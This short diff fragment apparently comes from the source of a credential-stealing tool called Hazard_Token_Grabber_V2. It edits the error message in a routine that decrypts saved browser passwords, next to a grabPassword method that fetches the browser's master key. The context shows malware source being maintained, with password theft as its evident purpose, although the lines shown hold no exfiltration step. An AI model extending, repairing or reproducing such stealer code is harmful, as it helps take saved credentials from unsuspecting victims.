@@ -200,7 +200,7 @@ class Hazard_Token_Grabber_V2:
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except:
-            return "Chrome < 80"
+            return "Failed to decrypt password"
     
     def grabPassword(self):
         master_key = self.get_master_key()
